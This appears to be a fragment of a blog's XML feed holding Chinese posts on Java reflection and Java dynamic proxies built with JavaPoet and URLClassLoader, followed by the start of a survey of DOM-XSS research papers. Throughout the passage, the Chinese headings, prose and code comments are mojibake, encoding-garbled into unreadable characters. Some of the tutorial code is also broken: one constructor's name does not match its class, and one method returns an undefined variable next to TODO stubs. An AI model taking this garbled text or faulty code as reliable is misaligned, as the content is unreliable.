class="line">usernameField.get(user2);</span><br></pre></td></tr></table></figure><h2 id="è·å–ç±»ä¸­ç§æœ‰å±æ€§"><a href="#è·å–ç±»ä¸­ç§æœ‰å±æ€§" class="headerlink" title="è·å–ç±»ä¸­ç§æœ‰å±æ€§"></a>è·å–ç±»ä¸­ç§æœ‰å±æ€§</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Field passwordField=clazz.getDeclaredField(<span class="string">"password"</span>);</span><br><span class="line">passwordField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">passwordField.set(user2, <span class="string">"654321"</span>);</span><br></pre></td></tr></table></figure><h1 id="è·å–ç±»ä¸­æ–¹æ³•"><a href="#è·å–ç±»ä¸­æ–¹æ³•" class="headerlink" title="è·å–ç±»ä¸­æ–¹æ³•"></a>è·å–ç±»ä¸­æ–¹æ³•</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Method getInfoMethod=clazz.getDeclaredMethod(<span class="string">"getInfo"</span>, <span class="keyword">int</span><span class="class">.<span class="keyword">class</span>)</span>;</span><br></pre></td></tr></table></figure><h2 id="è°ƒç”¨æ–¹æ³•"><a href="#è°ƒç”¨æ–¹æ³•" class="headerlink" title="è°ƒç”¨æ–¹æ³•"></a>è°ƒç”¨æ–¹æ³•</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">getInfoMethod.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">String ret= (String) getInfoMethod.invoke(user2, <span class="number">1</span>);</span><br><span class="line">System.out.println(ret);</span><br></pre></td></tr></table></figure><h2 id="è°ƒç”¨é™æ€æ–¹æ³•"><a href="#è°ƒç”¨é™æ€æ–¹æ³•" class="headerlink" title="è°ƒç”¨é™æ€æ–¹æ³•"></a>è°ƒç”¨é™æ€æ–¹æ³•</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Method staticMethod=clazz.getDeclaredMethod(<span class="string">"staticMethod"</span>);</span><br><span class="line">staticMethod.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">staticMethod.invoke(<span class="keyword">null</span>);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> åå°„ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javaåŠ¨æ€ä»£ç†å­¦ä¹ ç¬”è®°</title>
      <link href="/java-java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/java-java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="ç”¨æ³•"><a href="#ç”¨æ³•" class="headerlink" title="ç”¨æ³•"></a>ç”¨æ³•</h1><p>javaåŠ¨æ€ä»£ç†æœºåˆ¶å¯ä»¥å®ç°ä½¿ç”¨ä¸€ä¸ªæŠ½è±¡çš„ä¸­ä»‹ç±»å¯¹ä»»æ„ç±»çš„ä»»æ„æ–¹æ³•è¿›è¡Œè¿›è¡Œä»£ç†ï¼Œå¤§è‡´åŸç†æ˜¯è¿è¡Œæ—¶ç”Ÿæˆä¸€ä¸ªä»£ç†ç±»ï¼Œä»£ç†ç±»å†è°ƒç”¨å§”æ‰˜å¯¹è±¡ã€‚</p><h2 id="åˆ›å»ºå§”æ‰˜å¯¹è±¡çš„æ¥å£"><a href="#åˆ›å»ºå§”æ‰˜å¯¹è±¡çš„æ¥å£" class="headerlink" title="åˆ›å»ºå§”æ‰˜å¯¹è±¡çš„æ¥å£"></a>åˆ›å»ºå§”æ‰˜å¯¹è±¡çš„æ¥å£</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Sell</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">sell</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="åˆ›å»ºæ¥å£çš„å®ç°"><a href="#åˆ›å»ºæ¥å£çš„å®ç°" class="headerlink" title="åˆ›å»ºæ¥å£çš„å®ç°"></a>åˆ›å»ºæ¥å£çš„å®ç°</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SellImpl</span> <span class="keyword">implements</span> <span class="title">Sell</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sell</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"In sell method."</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"In add method."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="å®ç°ä¸­ä»‹ç±»"><a href="#å®ç°ä¸­ä»‹ç±»" class="headerlink" title="å®ç°ä¸­ä»‹ç±»"></a>å®ç°ä¸­ä»‹ç±»</h2><p>ä¸­ä»‹ç±»å®ç°java.lang.reflect.InvocationHandleræ¥å£ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyInvocationHandler</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span> </span>&#123;</span><br><span class="line">    <span class="comment">// å§”æ‰˜ç±»å¯¹è±¡</span></span><br><span class="line">    <span class="keyword">private</span> Object object;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">DynamicProxy</span><span class="params">(Object object)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.object=object;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> InvocationTargetException, IllegalAccessException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Before"</span>);</span><br><span class="line">        Object result = method.invoke(object, args);</span><br><span class="line">        System.out.println(<span class="string">"After"</span>);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ç”¨æˆ·è°ƒç”¨"><a href="#ç”¨æˆ·è°ƒç”¨" class="headerlink" title="ç”¨æˆ·è°ƒç”¨"></a>ç”¨æˆ·è°ƒç”¨</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//åˆ›å»ºä¸­ä»‹ç±»å®ä¾‹</span></span><br><span class="line">        MyInvocationHandler inter = <span class="keyword">new</span> MyInvocationHandler(<span class="keyword">new</span> SellImpl());</span><br><span class="line">        <span class="comment">//åŠ ä¸Šè¿™å¥å°†ä¼šäº§ç”Ÿä¸€ä¸ª$Proxy0.classæ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶å³ä¸ºåŠ¨æ€ç”Ÿæˆçš„ä»£ç†ç±»æ–‡ä»¶</span></span><br><span class="line">        System.getProperties().put(<span class="string">"sun.misc.ProxyGenerator.saveGeneratedFiles"</span>,<span class="string">"true"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//è·å–ä»£ç†ç±»å®ä¾‹sell</span></span><br><span class="line">        Sell sell = (Sell)(Proxy.newProxyInstance(Sell.class.getClassLoader(), new Class[] &#123;Sell.class&#125;, inter));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//é€šè¿‡ä»£ç†ç±»å¯¹è±¡è°ƒç”¨ä»£ç†ç±»æ–¹æ³•ï¼Œå®é™…ä¸Šä¼šè½¬åˆ°invokeæ–¹æ³•è°ƒç”¨</span></span><br><span class="line">        sell.sell();</span><br><span class="line">        sell.add();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="åŸç†åˆ†æ"><a href="#åŸç†åˆ†æ" class="headerlink" title="åŸç†åˆ†æ"></a>åŸç†åˆ†æ</h1><ol><li>åŠ¨æ€ç”Ÿæˆä»£ç†ç±»ï¼Œå¹¶ä¸”åŠ¨æ€ç¼–è¯‘ï¼Œå†é€šè¿‡åå°„åˆ›å»ºå¯¹è±¡å¹¶åŠ è½½åˆ°å†…å­˜ä¸­ï¼š</li></ol><pre class="mermaid">graph LR   proxy[Proxy.newProxyInstance] -- JavaPoet --> java[C$Proxy0.java]   java -- Compile --> clazz[C$Proxy0.class]   clazz -- reflect --> sell[C$Proxy0]</pre><ol><li>åœ¨è°ƒç”¨æ—¶ï¼ŒC$Proxy0ä»£ç†InvocationHandlerï¼ŒInvocationHanderä»£ç†subjectã€‚</li></ol><h2 id="ç”Ÿæˆä»£ç†ç±»æºç "><a href="#ç”Ÿæˆä»£ç†ç±»æºç " class="headerlink" title="ç”Ÿæˆä»£ç†ç±»æºç "></a>ç”Ÿæˆä»£ç†ç±»æºç </h2><p>newProxyInstanceå°±æ˜¯å°†ä¸­ä»‹ç±»ç”Ÿæˆä»£ç†ç±»æºä»£ç çš„æ–¹æ³•ï¼Œç”Ÿæˆçš„ä»£ç†ç±»å¦‚ä¸‹ï¼Œå¯ä»¥çœ‹åˆ°å…¶åŒ…å«ä¸€ä¸ªInvocationHanderç±»ï¼Œå®ç°subjectçš„æ¥å£ï¼Œä½¿ç”¨åå°„è°ƒç”¨InvocationHanderï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.Override;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Proxy0</span> <span class="keyword">implements</span> <span class="title">Sell</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> InvocationHandler handler;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">Proxy0</span><span class="params">(InvocationHandler handler)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.handler=handler;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">    Method method = MyImpl.Sell.class.getMethod("add");</span><br><span class="line">    <span class="keyword">this</span>.handler.invoke(<span class="keyword">this</span>, method, <span class="keyword">null</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sell</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">    Method method = MyImpl.Sell.class.getMethod("sell");</span><br><span class="line">    <span class="keyword">this</span>.handler.invoke(<span class="keyword">this</span>, method, <span class="keyword">null</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥ä½¿ç”¨<a href="https://link.juejin.im/?target=https%3A%2F%2Fgithub.com%2Fsquare%2Fjavapoet" target="_blank" rel="noopener">JavaPoet</a>å®ç°ï¼Œä»£ç æ¥è‡ª<a href="https://juejin.im/post/5a99048a6fb9a028d5668e62" target="_blank" rel="noopener">10åˆ†é’Ÿçœ‹æ‡‚åŠ¨æ€ä»£ç†è®¾è®¡æ¨¡å¼</a>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.squareup.javapoet.FieldSpec;</span><br><span class="line"><span class="keyword">import</span> com.squareup.javapoet.JavaFile;</span><br><span class="line"><span class="keyword">import</span> com.squareup.javapoet.MethodSpec;</span><br><span class="line"><span class="keyword">import</span> com.squareup.javapoet.TypeSpec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> javax.lang.model.element.Modifier;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Proxy</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">newProxyInstance</span><span class="params">(Class subject,InvocationHandler handler)</span> <span class="keyword">throws</span> IOException,</span></span><br><span class="line"><span class="function">            ClassNotFoundException,</span></span><br><span class="line"><span class="function">            NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException </span>&#123;</span><br><span class="line">        <span class="comment">// ç”Ÿæˆproxy.java</span></span><br><span class="line">        TypeSpec.Builder typeSpecBuilder = TypeSpec.classBuilder(<span class="string">"Proxy0"</span>)</span><br><span class="line">                .addSuperinterface(subject);</span><br><span class="line"></span><br><span class="line">        FieldSpec fieldSpec = FieldSpec.builder(InvocationHandler.class, "handler", Modifier.PRIVATE).build();</span><br><span class="line">        typeSpecBuilder.addField(fieldSpec);</span><br><span class="line"></span><br><span class="line">        MethodSpec constructorMethodSpec = MethodSpec.constructorBuilder()</span><br><span class="line">                .addModifiers(Modifier.PUBLIC)</span><br><span class="line">                .addParameter(InvocationHandler.class, "handler")</span><br><span class="line">                .addStatement(<span class="string">"this.handler=handler"</span>)</span><br><span class="line">                .build();</span><br><span class="line">        typeSpecBuilder.addMethod(constructorMethodSpec);</span><br><span class="line"></span><br><span class="line">        Method[] methods = subject.getDeclaredMethods();</span><br><span class="line">        <span class="keyword">for</span> (Method method : methods) &#123;</span><br><span class="line">            MethodSpec methodSpec = MethodSpec.methodBuilder(method.getName())</span><br><span class="line">                    .addModifiers(Modifier.PUBLIC)</span><br><span class="line">                    .addAnnotation(Override<span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line"><span class="class">                    .<span class="title">returns</span>(<span class="title">method</span>.<span class="title">getReturnType</span>())</span></span><br><span class="line">                    .addCode("try &#123;\n")</span><br><span class="line">                    .addStatement(<span class="string">"\t$T method = "</span> + subject.getName() + <span class="string">".class.getMethod(\""</span> + method.getName() + <span class="string">"\")"</span>,</span><br><span class="line">                            Method<span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line"><span class="class">                    // ä¸ºäº†ç®€å•èµ·è§ï¼Œè¿™é‡Œå‚æ•°ç›´æ¥å†™æ­»ä¸ºç©º</span></span><br><span class="line">                    .addStatement("\tthis.handler.invoke(this, method, null)")</span><br><span class="line">                    .addCode(<span class="string">"&#125; catch(Exception e) &#123;\n"</span>)</span><br><span class="line">                    .addCode(<span class="string">"\te.printStackTrace();\n"</span>)</span><br><span class="line">                    .addCode(<span class="string">"&#125;\n"</span>)</span><br><span class="line">                    .build();</span><br><span class="line">            typeSpecBuilder.addMethod(methodSpec);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        JavaFile javaFile = JavaFile.builder(<span class="string">"MyImpl"</span>, typeSpecBuilder.build()).build();</span><br><span class="line">        <span class="comment">// ä¸ºäº†çœ‹çš„æ›´æ¸…æ¥šï¼Œæˆ‘å°†æºç æ–‡ä»¶ç”Ÿæˆåˆ°æ¡Œé¢</span></span><br><span class="line">        String srcPath=<span class="string">"./MyProxy"</span>;</span><br><span class="line">        javaFile.writeTo(<span class="keyword">new</span> File(srcPath));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ç¼–è¯‘æºä»£ç </span></span><br><span class="line">        <span class="comment">// TODO</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// åŠ è½½è¿›å†…å­˜å¹¶åå°„åˆ›å»ºå¯¹è±¡</span></span><br><span class="line">        <span class="comment">// TODO</span></span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ç¼–è¯‘Proxy0çš„æºä»£ç "><a href="#ç¼–è¯‘Proxy0çš„æºä»£ç " class="headerlink" title="ç¼–è¯‘Proxy0çš„æºä»£ç "></a>ç¼–è¯‘Proxy0çš„æºä»£ç </h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JavaCompiler</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">compile</span><span class="params">(File javaFile)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        javax.tools.JavaCompiler javaCompiler = ToolProvider.getSystemJavaCompiler();</span><br><span class="line">        StandardJavaFileManager fileManager = javaCompiler.getStandardFileManager(<span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line">        Iterable iterable = fileManager.getJavaFileObjects(javaFile);</span><br><span class="line">        javax.tools.JavaCompiler.CompilationTask task = javaCompiler.getTask(<span class="keyword">null</span>, fileManager, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>, iterable);</span><br><span class="line">        task.call();</span><br><span class="line">        fileManager.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨Proxy.newProxyInstance()ä¸­è°ƒç”¨ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JavaCompiler.compile(<span class="keyword">new</span> File(srcPath+<span class="string">"/MyImpl/Proxy0.java"</span>));</span><br></pre></td></tr></table></figure><h2 id="åŠ è½½è¿›å†…å­˜å¹¶åˆ›å»ºå¯¹è±¡"><a href="#åŠ è½½è¿›å†…å­˜å¹¶åˆ›å»ºå¯¹è±¡" class="headerlink" title="åŠ è½½è¿›å†…å­˜å¹¶åˆ›å»ºå¯¹è±¡"></a>åŠ è½½è¿›å†…å­˜å¹¶åˆ›å»ºå¯¹è±¡</h2><p>ä½¿ç”¨URLClassLoaderåŠ è½½.classæ–‡ä»¶</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">File filpath=<span class="keyword">new</span> File(<span class="string">""</span>);</span><br><span class="line">URL[] urls = <span class="keyword">new</span> URL[] &#123;<span class="keyword">new</span> URL(<span class="string">"file:"</span>+filpath.getAbsoluteFile()+<span class="string">"\\MyProxy\\"</span>)&#125;;</span><br><span class="line">URLClassLoader classLoader = <span class="keyword">new</span> URLClassLoader(urls);</span><br><span class="line">Class clazz = classLoader.loadClass(<span class="string">"MyImpl.Proxy0"</span>);</span><br><span class="line">Constructor constructor = clazz.getConstructor(InvocationHandler<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">constructor.setAccessible(<span class="keyword">true</span>); <span class="comment">//ä¸æ‡‚ ä¸ºä»€ä¹ˆå·²ç»æ˜¯publicçš„æ–¹æ³•è¿˜éœ€è¦setAccessible</span></span><br><span class="line">Object obj = constructor.newInstance(handler);</span><br></pre></td></tr></table></figure><h2 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h2><p>å¯ä»¥åƒç³»ç»Ÿå†…ç½®çš„é‚£æ ·è®¾ç½®åŠ¨æ€ä»£ç†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Sell sell = (Sell)Proxy.newProxyInstance(Sell<span class="class">.<span class="keyword">class</span>, <span class="title">new</span> <span class="title">MyInvocationHandler</span>(<span class="title">new</span> <span class="title">SellImpl</span>()))</span>;</span><br></pre></td></tr></table></figure><h1 id="å‚è€ƒæ–‡çŒ®"><a href="#å‚è€ƒæ–‡çŒ®" class="headerlink" title="å‚è€ƒæ–‡çŒ®"></a>å‚è€ƒæ–‡çŒ®</h1><ul><li>10åˆ†é’Ÿçœ‹æ‡‚åŠ¨æ€ä»£ç†è®¾è®¡æ¨¡å¼ï¼Œ<a href="https://juejin.im/post/5a99048a6fb9a028d5668e62" target="_blank" rel="noopener">https://juejin.im/post/5a99048a6fb9a028d5668e62</a></li><li>JavaåŠ¨æ€ä»£ç†ï¼Œ<a href="https://juejin.im/post/5ad3e6b36fb9a028ba1fee6a" target="_blank" rel="noopener">https://juejin.im/post/5ad3e6b36fb9a028ba1fee6a</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> åŠ¨æ€ä»£ç† </tag>
            
            <tag> åå°„ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2014-2019Webå®‰å…¨ç ”ç©¶æ–¹å‘è°ƒæŸ¥æŠ¥å‘Š</title>
      <link href="/%E5%AD%A6%E6%9C%AF-%E5%AD%A6%E6%9C%AF%E5%9C%882014-2019Web%E5%AE%89%E5%85%A8%E6%96%B9%E5%90%91%E7%A0%94%E7%A9%B6%E6%83%85%E5%86%B5/"/>
      <url>/%E5%AD%A6%E6%9C%AF-%E5%AD%A6%E6%9C%AF%E5%9C%882014-2019Web%E5%AE%89%E5%85%A8%E6%96%B9%E5%90%91%E7%A0%94%E7%A9%B6%E6%83%85%E5%86%B5/</url>
      
        <content type="html"><![CDATA[<h1 id="About"><a href="#About" class="headerlink" title="About"></a>About</h1><p>æœ¬æ–‡åˆ—å‡ºå››å¤§å®‰å…¨ä¼šè®®ï¼ˆUSENIXã€CCSã€NDSSå’ŒS&amp;Pï¼‰è¿‘5å¹´æ¥ä¸Webå®‰å…¨æœ‰å…³çš„ç ”ç©¶ï¼Œå·²å‘ç°webæ–¹å‘çš„ç ”ç©¶ç‚¹ã€‚</p><h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><p>ç ”ç©¶çƒ­ç‚¹èšç„¦åœ¨DOM-XSSä¸Šï¼š</p><h2 id="Donâ€™t-Trust-The-Locals-Investigating-the-Prevalence-of-Persistent-Client-Side-Cross-Site-Scripting-in-the-Wild-ndss19"><a href="#Donâ€™t-Trust-The-Locals-Investigating-the-Prevalence-of-Persistent-Client-Side-Cross-Site-Scripting-in-the-Wild-ndss19" class="headerlink" title="Donâ€™t Trust The Locals: Investigating the Prevalence of Persistent Client-Side Cross-Site Scripting in the Wild, ndss19*"></a>Donâ€™t Trust The Locals: Investigating the Prevalence of Persistent Client-Side Cross-Site Scripting in the Wild, ndss19*</h2><a id="more"></a><p>æˆ‘ä»¬é€šè¿‡æ±¡ç‚¹è·Ÿè¸ªæŠ€æœ¯å¯»æ‰¾å®¢æˆ·ç«¯çš„XSSé—®é¢˜(æ„Ÿè§‰è·Ÿâ€œRiding out DOMsday: Towards Detecting and Preventing DOM Cross-Site Scriptingâ€çš„ç ”ç©¶å¾ˆåƒ)</p><h2 id="Riding-out-DOMsday-Towards-Detecting-and-Preventing-DOM-Cross-Site-Scripting-ndss18"><a href="#Riding-out-DOMsday-Towards-Detecting-and-Preventing-DOM-Cross-Site-Scripting-ndss18" class="headerlink" title="Riding out DOMsday: Towards Detecting and Preventing DOM Cross-Site Scripting, ndss18*"></a>Riding out DOMsday: Towards Detecting and Preventing DOM Cross-Site Scripting, ndss18*</h2><h3 id="ä»€ä¹ˆæ˜¯DOMå‹XSSï¼š"><a href="#ä»€ä¹ˆæ˜¯DOMå‹XSSï¼š" class="headerlink" title="ä»€ä¹ˆæ˜¯DOMå‹XSSï¼š"></a>ä»€ä¹ˆæ˜¯DOMå‹XSSï¼š</h3><p><img src="/å­¦æœ¯-å­¦æœ¯åœˆ2014-2019Webå®‰å…¨æ–¹å‘ç ”ç©¶æƒ…å†µ/1546778397220.png" alt="1546778397220"></p><h3 id="æ€ä¹ˆé˜²å¾¡ï¼š"><a href="#æ€ä¹ˆé˜²å¾¡ï¼š" class="headerlink" title="æ€ä¹ˆé˜²å¾¡ï¼š"></a>æ€ä¹ˆé˜²å¾¡ï¼š</h3><p><img src="/å­¦æœ¯-å­¦æœ¯åœˆ2014-2019Webå®‰å…¨æ–¹å‘ç ”ç©¶æƒ…å†µ/1546778565366.png" alt="1546778565366"></p><h3 id="æ–¹æ³•"><a href="#æ–¹æ³•" class="headerlink" 